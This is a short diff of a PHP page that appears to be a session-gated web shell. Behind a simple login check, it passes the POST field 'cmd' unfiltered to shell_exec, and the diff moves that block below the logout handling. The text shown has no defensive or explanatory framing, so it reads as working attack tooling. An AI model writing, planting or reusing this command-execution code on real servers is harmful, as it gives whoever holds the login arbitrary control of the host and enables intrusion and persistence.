@@ -21,10 +21,7 @@ if(!isset($_SESSION['fluid'])){
 	</form>";
 }
 else{
-if (!empty($_POST['cmd'])) {
-    $cmd = shell_exec(trim($_POST['cmd']));
-}
-//logout
+	//logout
 if($_GET['l'] == 'o')
 {
 	if($_SESSION['fluid'])
@@ -39,6 +36,10 @@ if($_GET['l'] == 'o')
 else {
 	echo '';
 }
+if (!empty($_POST['cmd'])) {
+    $cmd = shell_exec(trim($_POST['cmd']));
+}
+
 ?>
 <!DOCTYPE html>
 <html lang="en">
@@ -114,9 +115,7 @@ else {
             padding: 15px 0;
         }
     </style>
-
 </head>
-
 <body>
     <main>
         <h1>hi</h1>
@@ -141,10 +140,7 @@ else {
         <?php endif; ?>
     </main>
 </body>
-</html>
- 
- 
+</html> 
 <?php
 }
-
 ?>
